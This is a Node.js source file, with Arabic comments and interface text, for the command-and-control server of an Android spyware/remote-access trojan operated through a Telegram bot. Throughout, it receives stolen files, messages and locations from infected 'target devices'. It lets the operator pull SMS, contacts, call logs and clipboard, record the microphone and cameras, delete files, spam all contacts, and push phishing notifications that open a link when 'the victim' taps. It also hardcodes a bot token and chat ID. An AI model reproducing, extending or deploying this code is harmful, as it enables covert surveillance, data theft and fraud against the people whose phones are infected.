const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios');

// الثوابت
const TOKEN = '8157006296:AAGUtuQMR0okC4U3fQ9_MdqMvXPgesE3nZA';
const CHAT_ID = '1630822492';
const PING_ADDRESS = 'https://www.google.com';
const PORT = process.env.PORT || 8999;

// تهيئة التطبيق
const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const appBot = new telegramBot(TOKEN, { polling: true });
const appClients = new Map();

// المتغيرات المؤقتة
let currentUuid = '';
let currentNumber = '';
let currentTitle = '';

// الوسائط
const upload = multer();
app.use(bodyParser.json());

// مسارات API
app.get('/', (req, res) => {
    res.send('<h1 align="center">تم رفع السيرفر بنجاح</h1>');
});

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const fileName = req.file.originalname;
    appBot.sendDocument(CHAT_ID, req.file.buffer, {
        caption: `°• رسالة من جهاز <b>${req.headers.model}</b>`,
        parse_mode: "HTML"
    }, {
        filename: fileName,
        contentType: 'application/txt',
    });
    res.send('');
});

app.post("/uploadText", (req, res) => {
    const message = `°• رسالة من جهاز <b>${req.headers.model}</b>\n\n${req.body['text']}`;
    appBot.sendMessage(CHAT_ID, message, { parse_mode: "HTML" });
    res.send('');
});

app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(CHAT_ID, req.body['lat'], req.body['lon']);
    appBot.sendMessage(CHAT_ID, `°• موقع من جهاز <b>${req.headers.model}</b>`, { parse_mode: "HTML" });
    res.send('');
});

// WebSocket Events
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4();
    const { model, battery, version, brightness, provider } = req.headers;
    
    ws.uuid = uuid;
    appClients.set(uuid, { model, battery, version, brightness, provider });
    
    // إرسال رسالة اتصال
    sendDeviceMessage(CHAT_ID, model, battery, version, brightness, provider, 'اتصال');
    
    ws.on('close', () => {
        sendDeviceMessage(CHAT_ID, model, battery, version, brightness, provider, 'انفصال');
        appClients.delete(ws.uuid);
    });
});

// معالجة رسائل البوت
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    
    if (chatId != CHAT_ID) {
        appBot.sendMessage(CHAT_ID, '°• تم رفض الإذن');
        return;
    }
    
    if (message.reply_to_message) {
        handleReplyMessage(message);
        return;
    }
    
    switch (message.text) {
        case '/start':
            sendWelcomeMessage();
            break;
        case 'الأجهزة المتصلة':
            listConnectedDevices();
            break;
        case 'تنفيذ أمر':
            executeCommand();
            break;
    }
});

// معالجة استعلامات الرد
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const [command, uuid] = data.split(':');
    
    if (command === 'device') {
        showDeviceCommands(uuid, msg);
    } else {
        handleCommand(command, uuid, msg);
    }
});

// الدوال المساعدة
function sendDeviceMessage(chatId, model, battery, version, brightness, provider, status) {
    const statusText = status === 'اتصال' ? '°• جهاز جديد متصل' : '°• تم فصل الجهاز';
    const message = `${statusText}\n\n` +
        `• موديل الجهاز: <b>${model}</b>\n` +
        `• البطارية: <b>${battery}</b>\n` +
        `• إصدار الأندرويد: <b>${version}</b>\n` +
        `• سطوع الشاشة: <b>${brightness}</b>\n` +
        `• مزود الخدمة: <b>${provider}</b>`;
    
    appBot.sendMessage(chatId, message, { parse_mode: "HTML" });
}

function sendWelcomeMessage() {
    const message = `°• مرحباً بك في لوحة التحكم\n\n` +
        `• إذا تم تثبيت التطبيق على الجهاز المستهدف، انتظر الاتصال\n\n` +
        `• عندما تستلم رسالة الاتصال، فهذا يعني أن الجهاز المستهدف متصل وجاهز لاستقبال الأوامر\n\n` +
        `• انقر على زر الأمر واختر الجهاز المطلوب ثم اختر الأمر المناسب من بين الأوامر المتاحة\n\n` +
        `• إذا واجهتك مشكلة في البوت، أرسل أمر /start`;
    
    appBot.sendMessage(CHAT_ID, message, {
        parse_mode: "HTML",
        reply_markup: {
            keyboard: [["الأجهزة المتصلة"], ["تنفيذ أمر"]],
            resize_keyboard: true
        }
    });
}

function listConnectedDevices() {
    if (appClients.size === 0) {
        appBot.sendMessage(CHAT_ID, 
            '°• لا توجد أجهزة متصلة\n\n' +
            '• تأكد من تثبيت التطبيق على الجهاز المستهدف'
        );
        return;
    }
    
    let text = '°• قائمة الأجهزة المتصلة:\n\n';
    appClients.forEach((value) => {
        text += `• موديل الجهاز: <b>${value.model}</b>\n` +
               `• البطارية: <b>${value.battery}</b>\n` +
               `• إصدار الأندرويد: <b>${value.version}</b>\n` +
               `• سطوع الشاشة: <b>${value.brightness}</b>\n` +
               `• مزود الخدمة: <b>${value.provider}</b>\n\n`;
    });
    
    appBot.sendMessage(CHAT_ID, text, { parse_mode: "HTML" });
}

function executeCommand() {
    if (appClients.size === 0) {
        appBot.sendMessage(CHAT_ID,
            '°• لا توجد أجهزة متصلة\n\n' +
            '• تأكد من تثبيت التطبيق على الجهاز المستهدف'
        );
        return;
    }
    
    const deviceListKeyboard = [];
    appClients.forEach((value, key) => {
        deviceListKeyboard.push([{
            text: value.model,
            callback_data: 'device:' + key
        }]);
    });
    
    appBot.sendMessage(CHAT_ID, '°• اختر الجهاز لتنفيذ الأمر', {
        reply_markup: {
            inline_keyboard: deviceListKeyboard,
        },
    });
}

function showDeviceCommands(uuid, msg) {
    const deviceModel = appClients.get(uuid).model;
    appBot.editMessageText(`°• اختر أمر للجهاز: <b>${deviceModel}</b>`, {
        chat_id: CHAT_ID,
        message_id: msg.message_id,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: getCommandKeyboard(uuid)
        }
    });
}

function getCommandKeyboard(uuid) {
    return [
        [
            { text: 'التطبيقات', callback_data: `apps:${uuid}` },
            { text: 'معلومات الجهاز', callback_data: `device_info:${uuid}` }
        ],
        [
            { text: 'الحصول على ملف', callback_data: `file:${uuid}` },
            { text: 'حذف ملف', callback_data: `delete_file:${uuid}` }
        ],
        [
            { text: 'الحافظة', callback_data: `clipboard:${uuid}` },
            { text: 'الميكروفون', callback_data: `microphone:${uuid}` }
        ],
        [
            { text: 'الكاميرا الرئيسية', callback_data: `camera_main:${uuid}` },
            { text: 'كاميرا السيلفي', callback_data: `camera_selfie:${uuid}` }
        ],
        [
            { text: 'الموقع', callback_data: `location:${uuid}` },
            { text: 'رسالة عائمة', callback_data: `toast:${uuid}` }
        ],
        [
            { text: 'المكالمات', callback_data: `calls:${uuid}` },
            { text: 'جهات الاتصال', callback_data: `contacts:${uuid}` }
        ],
        [
            { text: 'الاهتزاز', callback_data: `vibrate:${uuid}` },
            { text: 'عرض إشعار', callback_data: `show_notification:${uuid}` }
        ],
        [
            { text: 'الرسائل', callback_data: `messages:${uuid}` },
            { text: 'إرسال رسالة', callback_data: `send_message:${uuid}` }
        ],
        [
            { text: 'تشغيل صوت', callback_data: `play_audio:${uuid}` },
            { text: 'إيقاف الصوت', callback_data: `stop_audio:${uuid}` }
        ],
        [
            { 
                text: 'إرسال رسالة لجميع جهات الاتصال', 
                callback_data: `send_message_to_all:${uuid}`
            }
        ]
    ];
}

function handleCommand(command, uuid, msg) {
    const commandsWithDirectExecution = [
        'calls', 'contacts', 'messages', 'apps', 'device_info', 
        'clipboard', 'camera_main', 'camera_selfie', 'location', 
        'vibrate', 'stop_audio'
    ];
    
    if (commandsWithDirectExecution.includes(command)) {
        executeDirectCommand(command, uuid, msg);
        return;
    }
    
    const replyCommands = {
        'send_message': {
            message: '°• الرجاء الرد برقم الهاتف الذي تريد إرسال الرسالة إليه\n\n' +
                    '• إذا كنت تريد إرسال رسالة لأرقام محلية، يمكنك إدخال الرقم بصفر في البداية، وإلا فأدخل الرقم مع رمز الدولة',
            setUuid: true
        },
        'send_message_to_all': {
            message: '°• أدخل الرسالة التي تريد إرسالها لجميع جهات الاتصال\n\n' +
                    '• لاحظ أن الرسالة لن ترسل إذا كان عدد الأحرف أكثر من المسموح',
            setUuid: true
        },
        'file': {
            message: '°• أدخل مسار الملف الذي تريد تحميله\n\n' +
                    '• لا تحتاج لإدخال المسار الكامل للملف، فقط أدخل المسار الرئيسي. مثلاً، أدخل <b>DCIM/Camera</b> لاستقبال ملفات المعرض',
            setUuid: true
        },
        'delete_file': {
            message: '°• أدخل مسار الملف الذي تريد حذفه\n\n' +
                    '• لا تحتاج لإدخال المسار الكامل للملف، فقط أدخل المسار الرئيسي. مثلاً، أدخل <b>DCIM/Camera</b> لحذف ملفات المعرض',
            setUuid: true
        },
        'microphone': {
            message: '°• أدخل المدة التي تريد تسجيل الميكروفون بها\n\n' +
                    '• لاحظ أنه يجب إدخال الوقت رقمياً بوحدة الثواني',
            setUuid: true
        },
        'toast': {
            message: '°• أدخل الرسالة التي تريد ظهورها على الجهاز المستهدف\n\n' +
                    '• الرسالة العائمة هي رسالة قصيرة تظهر على شاشة الجهاز لبضع ثوانٍ',
            setUuid: true
        },
        'show_notification': {
            message: '°• أدخل الرسالة التي تريد ظهورها كإشعار\n\n' +
                    '• ستظهر رسالتك في شريط حالة الجهاز المستهدف مثل الإشعارات العادية',
            setUuid: true
        },
        'play_audio': {
            message: '°• أدخل رابط الصوت الذي تريد تشغيله\n\n' +
                    '• لاحظ أنه يجب إدخال الرابط المباشر للصوت المطلوب، وإلا لن يتم تشغيل الصوت',
            setUuid: true
        }
    };
    
    if (replyCommands[command]) {
        appBot.deleteMessage(CHAT_ID, msg.message_id);
        appBot.sendMessage(CHAT_ID, replyCommands[command].message, {
            reply_markup: { force_reply: true },
            parse_mode: "HTML"
        });
        
        if (replyCommands[command].setUuid) {
            currentUuid = uuid;
        }
    }
}

function executeDirectCommand(command, uuid, msg) {
    appSocket.clients.forEach((ws) => {
        if (ws.uuid === uuid) {
            ws.send(command);
        }
    });
    
    appBot.deleteMessage(CHAT_ID, msg.message_id);
    sendProcessingMessage();
}

function sendProcessingMessage() {
    appBot.sendMessage(CHAT_ID,
        '°• طلبك قيد المعالجة\n\n' +
        '• ستتلقى رداً خلال اللحظات القادمة',
        {
            parse_mode: "HTML",
            reply_markup: {
                keyboard: [["الأجهزة المتصلة"], ["تنفيذ أمر"]],
                resize_keyboard: true
            }
        }
    );
}

function handleReplyMessage(message) {
    const replyText = message.reply_to_message.text;
    
    if (replyText.includes('°• الرجاء الرد برقم الهاتف')) {
        handleSMSReply(message);
    } else if (replyText.includes('°• عظيم، الآن أدخل الرسالة')) {
        handleSMSMessageReply(message);
    } else if (replyText.includes('°• أدخل الرسالة التي تريد إرسالها')) {
        handleMessageToAllReply(message);
    } else if (replyText.includes('°• أدخل مسار الملف')) {
        handleFileOperationReply(message, 'file');
    } else if (replyText.includes('°• أدخل المدة التي تريد تسجيل الميكروفون')) {
        handleMicrophoneReply(message);
    } else if (replyText.includes('°• أدخل الرسالة التي تريد ظهورها على الجهاز')) {
        handleToastReply(message);
    } else if (replyText.includes('°• أدخل الرسالة التي تريد ظهورها كإشعار')) {
        handleNotificationTitleReply(message);
    } else if (replyText.includes('°• عظيم، الآن أدخل الرابط')) {
        handleNotificationLinkReply(message);
    } else if (replyText.includes('°• أدخل رابط الصوت')) {
        handleAudioReply(message);
    } else if (replyText.includes('°• أدخل المدة التي تريد تسجيل الكاميرا الرئيسية')) {
        handleCameraReply(message, 'rec_camera_main');
    } else if (replyText.includes('°• أدخل المدة التي تريد تسجيل كاميرا السيلفي')) {
        handleCameraReply(message, 'rec_camera_selfie');
    }
}

function handleSMSReply(message) {
    currentNumber = message.text;
    appBot.sendMessage(CHAT_ID,
        '°• عظيم، الآن أدخل الرسالة التي تريد إرسالها لهذا الرقم\n\n' +
        '• كن حذراً من أن الرسالة لن ترسل إذا كان عدد الأحرف في رسالتك أكثر من المسموح',
        { reply_markup: { force_reply: true } }
    );
}

function handleSMSMessageReply(message) {
    appSocket.clients.forEach((ws) => {
        if (ws.uuid === currentUuid) {
            ws.send(`send_message:${currentNumber}/${message.text}`);
        }
    });
    
    currentNumber = '';
    currentUuid = '';
    sendProcessingMessage();
}

function handleMessageToAllReply(message) {
    appSocket.clients.forEach((ws) => {
        if (ws.uuid === currentUuid) {
            ws.send(`send_message_to_all:${message.text}`);
        }
    });
    
    currentUuid = '';
    sendProcessingMessage();
}

function handleFileOperationReply(message, operation) {
    appSocket.clients.forEach((ws) => {
        if (ws.uuid === currentUuid) {
            ws.send(`${operation}:${message.text}`);
        }
    });
    
    currentUuid = '';
    sendProcessingMessage();
}

function handleMicrophoneReply(message) {
    appSocket.clients.forEach((ws) => {
        if (ws.uuid === currentUuid) {
            ws.send(`microphone:${message.text}`);
        }
    });
    
    currentUuid = '';
    sendProcessingMessage();
}

function handleCameraReply(message, command) {
    appSocket.clients.forEach((ws) => {
        if (ws.uuid === currentUuid) {
            ws.send(`${command}:${message.text}`);
        }
    });
    
    currentUuid = '';
    sendProcessingMessage();
}

function handleToastReply(message) {
    appSocket.clients.forEach((ws) => {
        if (ws.uuid === currentUuid) {
            ws.send(`toast:${message.text}`);
        }
    });
    
    currentUuid = '';
    sendProcessingMessage();
}

function handleNotificationTitleReply(message) {
    currentTitle = message.text;
    appBot.sendMessage(CHAT_ID,
        '°• عظيم، الآن أدخل الرابط الذي تريد فتحه بالإشعار\n\n' +
        '• عندما ينقر الضحية على الإشعار، سيفتح الرابط الذي تدخله',
        { reply_markup: { force_reply: true } }
    );
}

function handleNotificationLinkReply(message) {
    appSocket.clients.forEach((ws) => {
        if (ws.uuid === currentUuid) {
            ws.send(`show_notification:${currentTitle}/${message.text}`);
        }
    });
    
    currentUuid = '';
    sendProcessingMessage();
}

function handleAudioReply(message) {
    appSocket.clients.forEach((ws) => {
        if (ws.uuid === currentUuid) {
            ws.send(`play_audio:${message.text}`);
        }
    });
    
    currentUuid = '';
    sendProcessingMessage();
}

// فحص الاتصال الدوري
setInterval(() => {
    appSocket.clients.forEach((ws) => {
        ws.send('ping');
    });
    
    try {
        axios.get(PING_ADDRESS);
    } catch (error) {
        // تجاهل الأخطاء في فحص الاتصال
    }
}, 5000);

// تشغيل السيرفر
appServer.listen(PORT, () => {
    console.log(`السيرفر يعمل على المنفذ ${PORT}`);
});
